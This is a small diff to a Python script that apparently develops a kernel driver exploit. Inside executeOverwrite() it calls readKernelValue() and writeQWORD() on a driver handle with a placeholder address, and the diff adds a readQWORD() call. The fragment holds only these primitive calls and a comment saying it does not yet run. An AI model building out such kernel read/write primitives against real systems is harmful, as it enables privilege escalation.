@@ -189,5 +189,6 @@ def executeOverwrite():
 	#This will not run until leakQWORD() definition problem is resolved.
 	readKernelValue()
         writeQWORD(driver_handle, 0x4142434445464748, 0x000000001a002000)
+	readQWORD()
         
 executeOverwrite()
